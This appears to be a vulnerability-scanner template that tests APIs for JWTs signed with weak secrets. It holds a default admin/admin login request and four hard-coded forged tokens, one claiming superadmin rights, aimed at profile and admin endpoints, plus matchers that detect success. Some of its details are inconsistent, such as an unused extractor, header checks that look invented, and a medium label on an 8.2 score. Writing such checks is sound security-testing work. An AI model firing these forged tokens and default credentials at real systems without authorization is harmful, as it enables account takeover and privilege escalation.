id: medium-api-json-web-token-weak-secret

info:
  name: JWT Weak Secret Exploitation
  author: redteam-elite
  severity: medium
  description: |
    Detects JWT implementations using weak secrets that can be cracked through
    dictionary attacks or brute force. Tests common weak secrets, default keys,
    and predictable signing keys that compromise JWT security.
  reference:
    - https://tools.ietf.org/html/rfc7519
    - https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.2
    cwe-id: CWE-521
  tags: jwt,weak,secret,brute-force,authentication,api,medium

http:
  - raw:
      - |
        POST /api/auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        {"username":"admin","password":"admin"}

      - |
        GET /api/user/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{forged_jwt_secret}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

      - |
        GET /api/user/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{forged_jwt_password}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

      - |
        GET /api/user/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{forged_jwt_key}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

      - |
        GET /api/admin/users HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{forged_jwt_admin}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    variables:
      # JWT forged with weak secret "secret"
      forged_jwt_secret: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.X-CC4Q89R_7VxXVNHQgw57O2rSHaD5rzBVcHqmAoVBM"
      # JWT forged with weak secret "password"  
      forged_jwt_password: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.bMqA0LbzQy07w3uBJAuXzk7I2DDho6VBKSiLMvwehEs"
      # JWT forged with weak secret "key"
      forged_jwt_key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.PRSm5J8GI6Zu2IxmBjpmOt5r4zDjEUZjlKBwF6Iqf1s"
      # JWT forged with elevated privileges
      forged_jwt_admin: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6InN1cGVyYWRtaW4iLCJpYXQiOjE2MTYyMzkwMjIsInJvbGUiOiJzdXBlcmFkbWluIiwiYWRtaW4iOnRydWV9.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ufqhBZAo"

    extractors:
      - type: regex
        name: original_jwt
        group: 1
        regex:
          - '"token":\s*"([^"]+)"'
          - '"access_token":\s*"([^"]+)"'
        internal: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: regex
        part: body
        regex:
          - '"id":\s*\d+'
          - '"username":\s*"[^"]+"'
          - '"role":\s*"admin"'
          - '"role":\s*"superadmin"'
          - '"admin":\s*true'
          - '"users":\s*\['
        condition: or

      - type: regex
        part: body
        negative: true
        regex:
          - '"error":\s*"invalid.*token"'
          - '"error":\s*"token.*expired"'
          - '"error":\s*"signature.*verification.*failed"'
          - 'jwt.*invalid'
          - 'unauthorized'

      - type: word
        part: header
        negative: true
        words:
          - "X-JWT-Strong-Secret: enabled"
          - "X-Token-Validation: strict"

    stop-at-first-match: true